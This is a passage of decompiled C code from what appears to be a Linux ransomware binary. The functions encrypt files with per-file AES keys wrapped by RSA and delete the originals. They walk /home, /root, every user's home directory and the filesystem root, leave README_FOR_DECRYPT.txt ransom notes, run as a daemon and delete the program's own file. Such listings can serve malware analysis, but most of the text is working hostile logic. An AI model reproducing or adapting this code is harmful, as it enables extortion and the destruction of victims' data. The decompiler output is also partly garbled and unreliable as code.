    int32_t str = *(int32_t *)&g189; // 0x8048b97
    g5 = str;
    int32_t len = strlen((char *)str);
    int32_t v4 = mbedtls_ctr_drbg_seed((int32_t)&g224, (int32_t)mbedtls_entropy_func, (int32_t)&g223, str, len); // 0x8048bbc
    char * format;
    if (v4 == 0) {
        int32_t v5 = mbedtls_pk_init(&g225); // 0x8048bdc
        int32_t v6; // 0x8048c03
        if (g7 == 0) {
            // 0x8048bf7
            v6 = mbedtls_pk_parse_keyfile((char *)&g225, g3, (int32_t)&g109);
            // branch -> 0x8048c08
        } else {
            // 0x8048be8
            v6 = mbedtls_pk_parse_public_keyfile((char *)&g225, g3, v5);
            // branch -> 0x8048c08
        }
        // 0x8048c08
        if (v6 == 0) {
            // 0x8048c28
            g3 = v3;
            g7 = v2;
            g5 = v1;
            int32_t path;
            return unlink((char *)path);
        }
        format = "error loading %s\n";
    } else {
        // 0x8048bc8
        format = " failed\n  ! mbedtls_ctr_drbg_seed returned -0x%04x\n";
        // branch -> 0x8048c17
    }
    // 0x8048c17
    printf(format);
    exit(1);
    // UNREACHABLE
}

// Address range: 0x8048c37 - 0x8048c6b
int32_t is_symlink(char * a1) {
    int32_t result; // 0x8048c6b_2
    int32_t v1;
    if (lstat64(a1, (struct stat64 *)&v1) >= 0) {
        // 0x8048c57
        int32_t v2;
        result = (v2 & 0xf000) == 0xa000;
        // branch -> 0x8048c6a
    } else {
        result = 1;
    }
    // 0x8048c6a
    return result;
}

// Address range: 0x8048c6c - 0x8048e9f
int32_t encrypt_file(struct _IO_FILE * path, int32_t a2) {
    int32_t v1;
    int32_t v2;
    int32_t v3;
    int32_t v4;
    if (setChmod((char *)path, 6, v4, v3, v2, v1) == -1) {
        // 0x8048e98
        return 0;
    }
    int32_t v5 = is_symlink((char *)path); // 0x8048c92
    int32_t result2 = v5; // 0x8048e9f_2
    if (v5 == 0) {
        // 0x8048ca8
        int32_t buf;
        stat((char *)path, (struct stat *)&buf);
        int32_t v6;
        int32_t data = v6;
        g7 = (int32_t)fopen64((char *)path, "rb");
        struct _IO_FILE * v7 = fopen64((char *)a2, "wb"); // 0x8048ce9
        int32_t v8 = (int32_t)v7; // 0x8048ce9_5
        g3 = v8;
        int32_t v9 = g7; // 0x8048cfd
        int32_t result;
        int32_t file;
        if (v7 == NULL) {
            // 0x8048cfd
            if (v9 == 0) {
                // 0x8048e98
                return 0;
            }
            // 0x8048d05
            file = v9;
            // branch -> 0x8048d0f
        } else {
            // 0x8048cf7
            if (v9 != 0) {
                int32_t v10 = randstring(16); // 0x8048d1e
                char * mem = malloc(2048); // 0x8048d30
                g4 = (int32_t)memset(mem, 0, 512);
                g5 = 0;
                char v11 = rand();
                *(char *)(g2 - 48 + g5) = v11;
                int32_t v12 = g5 + 1; // 0x8048d58
                g5 = v12;
                // branch -> 0x8048d4f
                while (v12 != 16) {
                    // 0x8048d4f
                    v11 = rand();
                    *(char *)(g2 - 48 + g5) = v11;
                    v12 = g5 + 1;
                    g5 = v12;
                    // continue -> 0x8048d4f
                }
                // 0x8048d5e
                int32_t v13;
                int32_t v14;
                int32_t v15 = public_encrypt(v10, 16, (int32_t)mem, (int32_t)v11 & -256 | v14 & 240 | v13 % 16); // 0x8048d81
                int32_t data2 = v15;
                struct _IO_FILE * path2;
                if (v15 == -1) {
                    // 0x8048d8f
                    fclose((struct _IO_FILE *)g7);
                    fclose((struct _IO_FILE *)g3);
                    path2 = (struct _IO_FILE *)a2;
                    // branch -> 0x8048e90
                } else {
                    // 0x8048da9
                    fwrite((char *)&data, 1, 4, (struct _IO_FILE *)g3);
                    fwrite((char *)&data2, 1, 4, (struct _IO_FILE *)g3);
                    fwrite(mem, 1, data2, (struct _IO_FILE *)g3);
                    int32_t data3;
                    fwrite((char *)&data3, 1, 16, (struct _IO_FILE *)g3);
                    int32_t v16;
                    int32_t v17 = &v16; // 0x8048e0e_0
                    int32_t data4;
                    int32_t v18 = &data4; // 0x8048e21_0
                    if (v13 > 0) {
                        int32_t v19 = v13; // 0x8048dfc
                        int32_t v20 = 0;
                        while (true) {
                            int32_t v21 = v19 - 16; // 0x8048dfc
                            int32_t v22 = v21 == 0 | v21 < 0 ^ (15 - v19 & v19) < 0 ? v19 : 16;
                            g5 = v21;
                            if (fread_unlocked((char *)&v16, 1, v22, (struct _IO_FILE *)g7) >= 1) {
                                // 0x8048e1e
                                aes_encrypt(v17, 16, v10, (int32_t)&data3, v18);
                                fwrite((char *)&data4, 1, 16, (struct _IO_FILE *)g3);
                                int32_t v23 = v20 + 16; // 0x8048e4e
                                if (v23 < v13) {
                                    // 0x8048e1e
                                    v19 = g5;
                                    v20 = v23;
                                    // branch -> 0x8048dfc
                                    continue;
                                }
                            }
                        }
                    }
                    // 0x8048e63
                    fclose((struct _IO_FILE *)g7);
                    fclose((struct _IO_FILE *)g3);
                    free((char *)v10);
                    free(mem);
                    path2 = path;
                    // branch -> 0x8048e90
                }
                // 0x8048e90
                result = unlink((char *)path2);
                // branch -> 0x8048e95
                // 0x8048e95
                // branch -> 0x8048e98
                // 0x8048e98
                return result;
            }
            file = v8;
        }
        // 0x8048d0f
        result = fclose((struct _IO_FILE *)file);
        // branch -> 0x8048e95
        // 0x8048e95
        result2 = result;
        // branch -> 0x8048e98
    }
    // 0x8048e98
    return result2;
}

// Address range: 0x8048ea0 - 0x8049096
char * encrypt_directory(char * a1) {
    int32_t v1 = g5; // 0x8048ea3
    int32_t v2 = g7; // 0x8048ea4
    int32_t v3 = g3; // 0x8048ea5
    g3 = (int32_t)a1;
    int32_t v4 = checkExclude(a1); // 0x8048eb0
    if (v4 != 0) {
        // 0x804908f
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return (char *)v4;
    }
    char * mem = malloc(0x1000); // 0x8048ec8
    strcpy(mem, (char *)g3);
    int32_t v5 = g194; // 0x8048ed8
    int32_t v6 = (int32_t)g193;
    *(int32_t *)(v6 + 4 * v5) = (int32_t)mem;
    g194 = v5 + 1;
    int32_t v7 = (int32_t)(struct __dirstream *)mem; // ecx
    g7 = (int32_t)(struct __dirstream *)v6;
    g193 = (struct __dirstream *)realloc((char *)v6, 4 * v5 + 8);
    int32_t v8;
    int32_t v9;
    int32_t v10;
    setChmod((char *)g3, 4, v10, v9, v8, 0);
    struct __dirstream * dirp = opendir((char *)g3); // 0x8048f11
    int32_t v11; // 0x8049096_2
    if (dirp != NULL) {
        // 0x8048f27
        int32_t v12;
        g7 = &v12;
        int32_t str2;
        int32_t v13 = &str2; // 0x8049013_0
        struct dirent64 * v14 = readdir64(dirp); // 0x8048f36107
        int32_t v15; // 0x8049053
        struct _IO_FILE * v16; // 0x8049087
        int32_t str3; // 0x804906a
        if (v14 != NULL) {
            int32_t v17 = (int32_t)v14; // 0x3110
            while (true) {
                int32_t str = v17 + 19; // 0x8048f46
                g5 = str;
                if (((int32_t)*(char *)(v17 + 18) || v17 & -256) == 4) {
                    // 0x8048fad
                    // branch -> 0x8048f2d
                } else {
                    // 0x8048f50
                    if (strcmp((char *)str, "..") != 0) {
                        // 0x8048f64
                        if (strcmp((char *)g5, ".") != 0) {
                            int32_t chars_printed = snprintf((char *)g7, 0x1000, "%s/%s", (char *)g3, (struct __dirstream *)g5);
                            if (chars_printed > 4095) {
                                // 0x804908f
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                return (char *)chars_printed;
                            }
                            // 0x8049042
                            encrypt_directory((char *)g7);
                            // branch -> 0x8048f2d
                        }
                    }
                }
                struct dirent64 * v18 = readdir64(dirp); // 0x8048f36
                if (v18 == NULL) {
                    // break -> 0x804904a
                    break;
                }
                v17 = (int32_t)v18;
                // continue -> 0x8048f46
            }
            // 0x804904a
            v15 = closedir(dirp);
            v11 = v15;
            if (v15 == 0) {
                // 0x804905f
                if (g195 != NULL) {
                    // 0x8049068
                    str3 = g3;
                    g3 = v13;
                    strcpy((char *)&str2, (char *)str3);
                    strcat((char *)g3, "/README_FOR_DECRYPT.txt");
                    v16 = putReadme(g3, (int32_t)"/README_FOR_DECRYPT.txt", v7);
                    v11 = (int32_t)v16;
                    // branch -> 0x804908f
                } else {
                    v11 = 0;
                }
            }
            // 0x804908f
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return (char *)v11;
        }
        // 0x804904a
        v15 = closedir(dirp);
        if (v15 == 0) {
            // 0x804905f
            if (g195 != NULL) {
                // 0x8049068
                str3 = g3;
                g3 = v13;
                strcpy((char *)&str2, (char *)str3);
                strcat((char *)g3, "/README_FOR_DECRYPT.txt");
                v16 = putReadme(g3, (int32_t)"/README_FOR_DECRYPT.txt", v7);
                v11 = (int32_t)v16;
                // branch -> 0x804908f
            } else {
                v11 = 0;
            }
            // 0x804908f
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return (char *)v11;
        }
        v11 = v15;
    } else {
        v11 = 0;
    }
    // 0x804908f
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return (char *)v11;
}

// Address range: 0x8049097 - 0x80490e2
int32_t startsWith(char * str, char * a2) {
    int32_t str2 = (int32_t)a2; // esi
    uint32_t len = strlen(str); // 0x80490c1
    int32_t result; // 0x80490d5
    if (strlen((char *)str2) >= len) {
        // 0x80490c5
        result = strncmp(str, (char *)str2, len) == 0;
        // branch -> 0x80490db
    } else {
        result = 0;
    }
    // 0x80490db
    return result;
}

// Address range: 0x80490e3 - 0x8049118
int32_t checkDirStart(int32_t a1) {
    int32_t v1 = g7; // 0x80490e6
    g7 = a1;
    int32_t v2 = g3; // 0x80490ea
    g3 = 0;
    int32_t v3 = 0; // 0x80490f0
    // branch -> 0x80490ed
    while (true) {
        int32_t v4 = *(int32_t *)(4 * v3 + (int32_t)&g10); // 0x80490f0
        int32_t result = 1;
        if (startsWith((char *)v4, (char *)a1) == 0) {
            int32_t v5 = g3 + 1; // 0x804910a
            g3 = v5;
            if (v5 == 3) {
                // 0x8049110
                result = 0;
                // branch -> 0x8049112
                // 0x8049112
                g1 = result;
                g3 = v2;
                g7 = v1;
                return result;
            }
            // 0x804910a
            v3 = v5;
            a1 = g7;
            // branch -> 0x80490ed
            continue;
        }
        // 0x8049112
        g1 = result;
        g3 = v2;
        g7 = v1;
        return result;
    }
}

// Address range: 0x8049119 - 0x804928c
struct __dirstream * find_and_do(char * name, int32_t a2) {
    int32_t v1 = g5; // 0x804911c
    int32_t v2 = g7; // 0x804911d
    int32_t v3 = g3; // 0x804911e
    g3 = (int32_t)name;
    struct __dirstream * dirp = opendir(name); // 0x8049129
    if (dirp == NULL) {
        // 0x8049285
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return (struct __dirstream *)0;
    }
    // 0x804913f
    int32_t v4;
    g5 = &v4;
    int32_t v5; // 0x804928c_2
    if (is_ignore_dir((char *)g3) != 0) {
        // 0x8049274
        v5 = closedir(dirp);
        // branch -> 0x8049285
        // 0x8049285
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return (struct __dirstream *)v5;
    }
    while (true) {
        struct dirent64 * v6 = readdir64(dirp); // 0x8049162
        int32_t v7 = (int32_t)v6; // 0x8049162_3
        if (v6 != NULL) {
            int32_t str = v7 + 19; // 0x8049172
            g7 = str;
            if (((int32_t)*(char *)(v7 + 18) || v7 & -256) == 4) {
                // 0x8049233
                // branch -> 0x8049145
            } else {
                // 0x8049180
                if (strcmp((char *)str, "..") != 0) {
                    // 0x8049194
                    if (strcmp((char *)g7, ".") != 0) {
                        // 0x80491a8
                        int32_t chars_printed;
                        if (strcmp("/", (char *)g3) == 0) {
                            // 0x80491bc
                            chars_printed = snprintf((char *)g5, 0x1000, "/%s", (char *)g7);
                            // branch -> 0x80491ea
                        } else {
                            // 0x80491d2
                            chars_printed = snprintf((char *)g5, 0x1000, "%s/%s", (char *)g3, (struct __dirstream *)g7);
                            // branch -> 0x80491ea
                        }
                        int32_t v8 = chars_printed - 4095; // 0x80491ea
                        v5 = chars_printed;
                        if (v8 == 0 || v8 < 0 ^ (4094 - chars_printed & chars_printed) < 0) {
                            // 0x80491f5
                            int32_t v9;
                            setChmod((char *)g5, 6, chars_printed, chars_printed, v9, 0);
                            if (checkDirStart(g7) != 0) {
                                // 0x804920e
                                if (is_ignore_dir((char *)g3) == 0) {
                                    // 0x8049267
                                    encrypt_directory((char *)g5);
                                    // branch -> 0x804926c
                                  lab_0x804926c:
                                    // 0x804926c
                                    // branch -> 0x8049145
                                    // 0x8049145
                                    if (is_ignore_dir((char *)g3) != 0) {
                                        // break -> 0x8049274
                                        break;
                                    }
                                    // continue -> 0x8049159
                                    continue;
                                }
                            }
                            // 0x8049224
                            find_and_do((char *)g5, 6);
                            // branch -> 0x804926c
                            goto lab_0x804926c;
                        }
                        // 0x8049285
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        return (struct __dirstream *)v5;
                    }
                }
            }
            // 0x8049145
            if (is_ignore_dir((char *)g3) != 0) {
                // break -> 0x8049274
                break;
            }
            // continue -> 0x8049159
            continue;
        }
        // 0x8049274
        v5 = closedir(dirp);
        // branch -> 0x8049285
        // 0x8049285
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return (struct __dirstream *)v5;
    }
    // 0x8049274
    v5 = closedir(dirp);
    // branch -> 0x8049285
    // 0x8049285
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return (struct __dirstream *)v5;
}

// Address range: 0x804928d - 0x80492cc
char * up_encrypt(char * str) {
    int32_t v1 = g3; // 0x8049290
    char * mem = malloc(1024); // 0x8049299
    g3 = (int32_t)mem;
    int32_t dest_str = (int32_t)strcpy(mem, str); // 0x80492a6_5
    int32_t v2;
    int32_t v3 = &v2; // 0x80492c0_4
    int32_t v4 = g3;
    if (*(char *)v4 == 0) {
        // 0x80492c8
        g3 = v1;
        return (char *)dest_str;
    }
    *(int32_t *)(v3 - 16) = v4;
    *(int32_t *)(v3 - 20) = 0x80492b6;
    find_and_do(str, 0);
    *(int32_t *)g8 = g3;
    *(int32_t *)(g8 - 4) = 0x80492be;
    int32_t v5 = extract(str); // 0x80492b9
    g3 = v5;
    // branch -> 0x80492ad
    while (*(char *)v5 != 0) {
        // 0x80492ad
        *(int32_t *)(v3 - 16) = v5;
        *(int32_t *)(v3 - 20) = 0x80492b6;
        find_and_do(str, 0);
        *(int32_t *)g8 = g3;
        *(int32_t *)(g8 - 4) = 0x80492be;
        v5 = extract(str);
        g3 = v5;
        // continue -> 0x80492ad
    }
    // 0x80492c8
    g3 = v1;
    return (char *)v5;
}

// Address range: 0x80492cd - 0x804954f
int main(int argc, char ** argv) {
    g3 = (int32_t)argv;
    g7 = argc;
    srand(time(NULL));
    g193 = (struct __dirstream *)malloc(1);
    int32_t buf;
    getcwd((char *)&buf, 1024);
    int32_t str = *(int32_t *)(g3 + 4); // 0x804931c
    int32_t strcmp_rc = strcmp((char *)str, "encrypt"); // 0x8049327
    if (strcmp_rc == 0) {
        // 0x8049337
        puts("Start encrypting...");
        g5 = (int32_t)(struct __dirstream *)"Start encrypting...";
        struct _IO_FILE * v1 = (struct _IO_FILE *)1; // bp-1068
        int32_t v2 = *(int32_t *)(g3 + 8); // 0x8049348
        int32_t v3;
        int32_t v4;
        loadRSA(v2, (char **)1, v4, v3, buf, 0);
        if (g7 >= 4) {
            int32_t v5 = (int32_t)strdup((char *)*(int32_t *)(g3 + 12)); // 0x804935e_3
            g196 = v5;
            loadHtmlFile(v5, (char **)v1, v4, v3, buf);
            // branch -> 0x8049373
        }
        // 0x8049373
        loadTextFile();
        createDaemon();
        unlink((char *)*(int32_t *)g3);
        encrypt_directory("/home");
        encrypt_directory("/root");
        encrypt_directory((char *)argc);
        struct passwd * v6 = getpwent(); // 0x80493b6142
        struct _IO_FILE * stream; // 0x80493f7
        int32_t v7; // 0x80493df
        if (v6 != NULL) {
            *(int32_t *)(g8 - 16) = *(int32_t *)((int32_t)v6 + 20);
            encrypt_directory((char *)argc);
            struct passwd * v8 = getpwent(); // 0x80493b6
            while (v8 != NULL) {
                // 0x80493a8
                *(int32_t *)(g8 - 16) = *(int32_t *)((int32_t)v8 + 20);
                encrypt_directory((char *)argc);
                v8 = getpwent();
                // continue -> 0x80493a8
            }
            // 0x80493bf
            setpwent();
            up_encrypt((char *)&buf);
            find_and_do("/", (int32_t)v1);
            v7 = g196;
            if (v7 == 0) {
                // 0x8049542
                return 0;
            }
            // 0x80493ef
            stream = fopen64((char *)v7, "ab+");
            if (stream == NULL) {
                // 0x8049542
                return 0;
            }
            // 0x8049409
            fputs((char *)g197, stream);
            fclose((struct _IO_FILE *)(int32_t)stream);
            // branch -> 0x804953f
            // 0x804953f
            // branch -> 0x8049542
            // 0x8049542
            return 0;
        }
        // 0x80493bf
        setpwent();
        up_encrypt((char *)&buf);
        find_and_do("/", (int32_t)v1);
        v7 = g196;
        if (v7 == 0) {
            // 0x8049542
            return 0;
        }
        // 0x80493ef
        stream = fopen64((char *)v7, "ab+");
        if (stream == NULL) {
            // 0x8049542
            return 0;
        }
        // 0x8049409
        fputs((char *)g197, stream);
        fclose((struct _IO_FILE *)(int32_t)stream);
        // branch -> 0x804953f
    } else {
        int32_t strcmp_rc2 = strcmp((char *)str, "decrypt"); // 0x804942c
        puts("Start decrypting...");
        if (strcmp_rc2 == 0) {
            // 0x804943c
            g5 = (int32_t)(struct _IO_FILE *)"decrypt";
            loadRSA(*(int32_t *)(g3 + 8), NULL, strcmp_rc, strcmp_rc, buf, 0);
            if (g7 >= 4) {
                // 0x804945d
                if (access((char *)*(int32_t *)(g3 + 12), F_OK) != -1) {
                    // 0x804946f
                    unlink((char *)*(int32_t *)(g3 + 12));
                    // branch -> 0x804947d
                }
            }
            // 0x804947d
            createDaemon();
            unlink((char *)*(int32_t *)g3);
            decrypt_all("/home");
            decrypt_all("/root");
            decrypt_all((char *)argc);
            struct passwd * v9 = getpwent(); // 0x80494bb152
            if (v9 != NULL) {
                *(int32_t *)(g8 - 16) = *(int32_t *)((int32_t)v9 + 20);
                decrypt_all((char *)argc);
                struct passwd * v10 = getpwent(); // 0x80494bb
                while (v10 != NULL) {
                    // 0x80494ad
                    *(int32_t *)(g8 - 16) = *(int32_t *)((int32_t)v10 + 20);
                    decrypt_all((char *)argc);
                    v10 = getpwent();
                    // continue -> 0x80494ad
                }
                // 0x804951f
                setpwent();
                up_decrypt((char *)&buf);
                decrypt_all("/");
                // branch -> 0x804953f
                // 0x804953f
                // branch -> 0x8049542
                // 0x8049542
                return 0;
            }
        } else {
            // 0x80494c6
            g5 = (int32_t)(struct __dirstream *)"Start decrypting...";
            int32_t v11 = *(int32_t *)(g3 + 4); // 0x80494d7
            loadRSA(v11, NULL, strcmp_rc, strcmp_rc, buf, 0);
            g7 = (int32_t)(struct __dirstream *)v11;
            unlink((char *)*(int32_t *)g3);
            decrypt_all("/home");
            decrypt_all("/root");
            decrypt_all((char *)argc);
            struct passwd * v12 = getpwent(); // 0x8049516162
            if (v12 != NULL) {
                *(int32_t *)(g8 - 16) = *(int32_t *)((int32_t)v12 + 20);
                decrypt_all((char *)argc);
                struct passwd * v13 = getpwent(); // 0x8049516
                while (v13 != NULL) {
                    // 0x8049508
                    *(int32_t *)(g8 - 16) = *(int32_t *)((int32_t)v13 + 20);
                    decrypt_all((char *)argc);
                    v13 = getpwent();
                    // continue -> 0x8049508
                }
                // 0x804951f
                setpwent();
                up_decrypt((char *)&buf);
                decrypt_all("/");
                // branch -> 0x804953f
                // 0x804953f
                // branch -> 0x8049542
                // 0x8049542
                return 0;
            }
        }
        // 0x804951f
        setpwent();
        up_decrypt((char *)&buf);
        decrypt_all("/");
        // branch -> 0x804953f
    }
    // 0x804953f
    // branch -> 0x8049542
    // 0x8049542
    return 0;
}

// Address range: 0x8049550 - 0x804985f
int32_t aes_gen_tables(void) {
    int32_t v1;
    int32_t v2 = &v1; // ebp
    int32_t v3; // bp-1040
    int32_t v4 = &v3; // 0x804956a_0
    v3 = 1;
    int32_t v5 = 1; // ecx
    int32_t v6 = 2; // 0x804958a
    int32_t v7 = 0; // 0x8049588
    int32_t v8 = 1; // 0x8049588
    int32_t v9 = 1; // 0x80495ad107
    // branch -> 0x8049588
    while (true) {
        uint32_t v10 = v7 ^ v8 ^ v6; // 0x804958a
        int32_t v11 = v10 % 256; // 0x804958c
        int32_t v12 = v11; // edx
        *(int32_t *)(v4 + 4 * v9) = v11;
        int32_t v13 = v12; // 0x80495a3
        *(int32_t *)(v2 - 2060 + 4 * v13) = v5;
        int32_t v14 = v5 + 1; // 0x80495ad
        v5 = v14;
        if (v14 == 256) {
            // 0x80495b8
            g210 = 1;
            int32_t v15 = 2; // 0x80495d2
            *(int32_t *)(4 + (int32_t)&g210) = v15;
            int32_t v16 = 2; // 0x80495ef
            // branch -> 0x80495d0
            while (v16 != 10) {
                int32_t v17 = 2 * v15; // 0x80495d0105
                v15 = v17 & 254 ^ ((v17 & 128) == 0 ? 0 : 27);
                *(int32_t *)(4 * v16 + (int32_t)&g210) = v15;
                v16++;
                // continue -> 0x80495d0
            }
            // 0x80495f7
            *(char *)&g199 = 99;
            int32_t v18 = 1; // eax
            *(char *)&g205 = 0;
            int32_t v19 = 1; // 0x804967b
            int32_t v20 = *(int32_t *)(v2 - 2060 + 4 * v19); // 0x8049615
            uint32_t v21 = *(int32_t *)(v2 - 1036 + 4 * (255 - v20)); // 0x804961c
            uint32_t v22 = (2 * v21 | v21 / 128) % 256; // 0x8049630
            uint32_t v23 = 2 * v22 & 254;
            int32_t v24 = v23 | v22 / 128; // 0x8049642
            uint32_t v25 = 2 * v24 & 254;
            int32_t v26 = v25 | v23 / 128; // 0x8049654
            int32_t v27 = v21 ^ 99 ^ v22 ^ v24 ^ v26 ^ (2 * v26 & 254 | v25 / 128); // 0x8049677
            *(char *)(v19 + (int32_t)&g199) = (char)v27;
            *(char *)(v27 + 0x8083500) = (char)v18;
            int32_t v28 = v18 + 1; // 0x8049687
            v18 = v28;
            // branch -> 0x8049610
            while (v28 != 256) {
                // 0x8049610
                v19 = v28;
                v20 = *(int32_t *)(v2 - 2060 + 4 * v19);
                v21 = *(int32_t *)(v2 - 1036 + 4 * (255 - v20));
                v22 = (2 * v21 | v21 / 128) % 256;
                v23 = 2 * v22 & 254;
                v24 = v23 | v22 / 128;
                v25 = 2 * v24 & 254;
                v26 = v25 | v23 / 128;
                v27 = v21 ^ 99 ^ v22 ^ v24 ^ v26 ^ (2 * v26 & 254 | v25 / 128);
                *(char *)(v19 + (int32_t)&g199) = (char)v27;
                *(char *)(v27 + 0x8083500) = (char)v18;
                v28 = v18 + 1;
                v18 = v28;
                // continue -> 0x8049610
            }
            // 0x8049695
            g4 = 0;
            int32_t v29 = 0; // 0x8049736
            // branch -> 0x8049701
            while (true) {
                unsigned char v30 = *(char *)(v29 + (int32_t)&g199); // 0x8049701
                int32_t v31 = v30; // 0x8049701
                int32_t v32 = 2 * v31 & 254 ^ (v30 > -1 ? 0 : 27); // 0x804971f
                int32_t v33 = 0x1000000 * (v32 ^ v31) | 0x10000 * v31 | 256 * v31 | v32; // 0x804973492
                *(int32_t *)(4 * v29 + (int32_t)&g200) = v33;
                int32_t v34 = 256 * v33 | v33 / 0x1000000; // 0x804973d
                *(int32_t *)(4 * g4 + (int32_t)&g201) = v34;
                int32_t v35 = 256 * v34 | v34 / 0x1000000; // 0x8049747
                *(int32_t *)(4 * g4 + (int32_t)&g202) = v35;
                *(int32_t *)(4 * g4 + (int32_t)&g203) = 256 * v35 | v35 / 0x1000000;
                unsigned char v36 = *(char *)(g4 + (int32_t)&g204); // 0x804975b
                int32_t v37 = v36; // 0x804975b
                g1 = v37;
                int32_t v38; // esi
                int32_t v39; // 0x80496d6
                if (v36 == 0) {
                    // 0x80496d0
                    v38 = 0;
                    g6 = 0;
                    v39 = 0;
                    // branch -> 0x80496d6
                } else {
                    int32_t v40 = *(int32_t *)(4 * v37 - 2060 + v2); // 0x804976a
                    int32_t v41;
                    int32_t v42 = v40 + v41; // 0x8049782
                    int32_t v43;
                    int32_t v44 = v40 + v43; // 0x804978c
                    int32_t v45 = v2 - 1036; // 0x80497a8
                    int32_t v46 = *(int32_t *)(v45 + 4 * (v42 + -255 * v42 / 51)); // 0x80497a8
                    int32_t v47 = *(int32_t *)(v45 + 4 * (v44 - 255 * v44 / 51)); // 0x80497c2
                    int32_t v48;
                    int32_t v49 = v40 + v48; // 0x80497d5
                    int32_t v50 = *(int32_t *)(v45 + 4 * (v49 + -255 * v49 / 51)); // 0x80497fb
                    uint32_t v51 = v50 ^ 0x10000 * v47 ^ 256 * v46; // 0x80497fb
                    int32_t v52;
                    int32_t v53 = v40 + v52; // 0x8049808
                    int32_t v54 = *(int32_t *)(v45 + 4 * (v53 - 255 * v53 / 51)); // 0x8049822
                    int32_t v55 = 0x1000000 * v54 ^ v51; // 0x804982c
                    int32_t v56 = v55 / 0x1000000 | 256 * v51; // 0x8049830
                    g6 = v56;
                    int32_t v57 = 256 * v56 | v51 / 0x10000 % 256; // 0x8049835
                    g1 = v57;
                    v38 = 256 * v57 | v51 / 256 % 256;
                    v39 = v55;
                    // branch -> 0x80496d6
                }
                // 0x80496d6
                *(int32_t *)(4 * g4 + (int32_t)&g206) = v39;
                *(int32_t *)(4 * g4 + (int32_t)&g207) = g6;
                *(int32_t *)(4 * g4 + (int32_t)&g208) = g1;
                *(int32_t *)(4 * g4 + (int32_t)&g209) = v38;
                int32_t v58 = g4 + 1; // 0x80496f2
                g4 = v58;
                if (v58 == 256) {
                    // break -> 0x8049848
                    break;
                }
                v29 = v58;
                // continue -> 0x8049701
            }
            // 0x8049848
            g2 = v1;
            return g1;
        }
        // 0x8049588
        v6 = 2 * v13;
        v7 = (v10 & 128) == 0 ? 0 : 27;
        v8 = v12;
        v9 = v14;
        // branch -> 0x8049588
    }
}

// Address range: 0x8049860 - 0x804987f
int32_t mbedtls_aes_free(char * a1) {
    int32_t result = (int32_t)a1;
    if (a1 == NULL) {
        // 0x804987a
        return result;
    }
    // 0x804986a
    g6 = result + 280;
    *(char *)result = 0;
    int32_t result2 = result + 1; // 0x8049873
    // branch -> 0x8049870
    while (result2 != g6) {
        // 0x8049870
        *(char *)result2 = 0;
        result2++;
        // continue -> 0x8049870
    }
    // 0x804987a
    // branch -> 0x804987a
    // 0x804987a
    return result2;
}

// Address range: 0x8049880 - 0x8049e0f
int32_t mbedtls_aes_encrypt(int32_t * a1, char * a2, char * a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a2;
    int32_t v3 = *(int32_t *)(v1 + 4); // 0x804988f
    unsigned char v4 = *(char *)(v2 + 1); // 0x8049895
    unsigned char v5 = *(char *)(v2 + 2); // 0x8049899
    unsigned char v6 = *(char *)(v2 + 5); // 0x80498a0
    unsigned char v7 = *a2; // 0x80498af
    int32_t v8 = *(int32_t *)(v3 + 4); // 0x80498b5
    unsigned char v9 = *(char *)(v2 + 3); // 0x80498ba
    int32_t v10 = *(int32_t *)v3; // 0x80498c6
    int32_t v11 = (0x1000000 * (int32_t)v9 | (int32_t)v7 | 0x10000 * (int32_t)v5 | 256 * (int32_t)v4) ^ v10; // edx
    unsigned char v12 = *(char *)(v2 + 6); // 0x80498c8
    unsigned char v13 = *(char *)(v2 + 4); // 0x80498d1
    unsigned char v14 = *(char *)(v2 + 7); // 0x80498d7
    int32_t v15 = (0x1000000 * (int32_t)v14 | (int32_t)v13 | 0x10000 * (int32_t)v12 | 256 * (int32_t)v6) ^ v8; // 0x80498e0
    unsigned char v16 = *(char *)(v2 + 9); // 0x80498e5
    unsigned char v17 = *(char *)(v2 + 10); // 0x80498e9
    unsigned char v18 = *(char *)(v2 + 14); // 0x80498ed
    unsigned char v19 = *(char *)(v2 + 8); // 0x80498f9
    unsigned char v20 = *(char *)(v2 + 11); // 0x8049902
    unsigned char v21 = *(char *)(v2 + 13); // 0x804990b
    int32_t v22 = *(int32_t *)(v3 + 8); // 0x804990f
    int32_t v23 = v22 ^ (0x1000000 * (int32_t)v20 | (int32_t)v19 | 0x10000 * (int32_t)v17 | 256 * (int32_t)v16); // 0x804990f
    unsigned char v24 = *(char *)(v2 + 12); // 0x8049917
    unsigned char v25 = *(char *)(v2 + 15); // 0x804991b
    int32_t v26 = *(int32_t *)(v3 + 12); // 0x8049926
    int32_t v27 = ((int32_t)v24 | 256 * (int32_t)v21 | 0x10000 * (int32_t)v18 | 0x1000000 * (int32_t)v25) ^ v26; // 0x8049926
    int32_t v28 = v3 + 16; // 0x8049929
    int32_t v29 = *(int32_t *)v1; // 0x8049932
    int32_t v30 = v29 / 2 - 1; // 0x8049936
    int32_t v31; // eax
    int32_t v32; // ebx
    int32_t v33; // edi
    int32_t v34;
    uint32_t v35; // 0x8049d07
    uint32_t v36; // 0x8049d8f
    uint32_t v37; // 0x8049ddc
    uint32_t v38; // 0x8049dec
    uint32_t v39; // 0x8049beb
    unsigned char v40; // 0x8049c66
    unsigned char v41; // 0x8049c78
    unsigned char v42; // 0x8049c87
    unsigned char v43; // 0x8049c9d
    unsigned char v44; // 0x8049cac
    unsigned char v45; // 0x8049cc1
    unsigned char v46; // 0x8049ccb
    unsigned char v47; // 0x8049cdd
    unsigned char v48; // 0x8049cfa
    unsigned char v49; // 0x8049d0e
    unsigned char v50; // 0x8049d1d
    unsigned char v51; // 0x8049d2a
    unsigned char v52; // 0x8049d42
    unsigned char v53; // 0x8049d57
    unsigned char v54; // 0x8049d66
    unsigned char v55; // 0x8049d7e
    int32_t v56; // 0x8049c63
    int32_t v57; // 0x8049ce7171
    int32_t v58; // 0x8049c6f
    int32_t v59; // 0x8049d15
    int32_t v60; // 0x8049d4e
    uint32_t result; // 0x8049df1
    int32_t v61; // 0x8049df4
    int32_t v62; // 0x8049b6a
    int32_t v63; // 0x8049b71
    int32_t v64; // 0x8049b8a
